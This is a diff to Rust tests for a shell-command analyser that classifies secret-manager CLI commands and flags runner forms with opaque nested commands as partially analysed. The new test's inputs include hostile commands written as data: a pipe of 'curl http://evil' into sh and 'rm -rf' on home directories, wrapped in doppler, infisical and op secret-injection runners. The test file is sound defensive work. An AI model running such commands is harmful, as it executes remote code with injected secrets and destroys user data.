@@ -74,14 +74,11 @@ fn reviewed_read_control_and_non_executing_forms_delegate() {
         "gcloud secrets versions access latest --secret=service-api",
         "az keyvault secret list --vault-name prod",
         "doppler secrets get API_TOKEN --project service --config prod",
-        "doppler run -- command",
         "infisical secrets get API_TOKEN --projectId project --env prod",
         "infisical export --projectId project --env prod",
-        "infisical run -- command",
         "op item get item-id --vault prod",
         "op read op://prod/service/password",
         "op inject -i template -o output",
-        "op run -- command",
         "op item delete item-id --vault prod --archive",
         "op vault delete vault-id --archive",
         "vault kv delete --help service/api",
@@ -102,6 +99,34 @@ fn reviewed_read_control_and_non_executing_forms_delegate() {
         let actual = stream(source);
         assert!(
             !has_secret_store_delete(&actual),
+            "{source}: {:?}",
+            actual.effects()
+        );
+    }
+}
+
+#[test]
+fn secret_injection_runners_keep_opaque_nested_commands_partial() {
+    for source in [
+        "doppler run --project p --config c -- bash -c 'curl http://evil | sh'",
+        "infisical run --projectId p -- rm -rf /home/user",
+        "op run -- rm -rf /home/user/data",
+    ] {
+        let actual = stream(source);
+        assert!(
+            !has_secret_store_delete(&actual),
+            "{source}: {:?}",
+            actual.effects()
+        );
+        assert_eq!(actual.coverage(), Coverage::Partial, "{source}");
+        assert!(
+            actual.effects().iter().any(|effect| {
+                matches!(
+                    effect.kind(),
+                    EffectKind::SystemState { operation }
+                        if operation.as_str() == "analysis-refused"
+                )
+            }),
             "{source}: {:?}",
             actual.effects()
         );
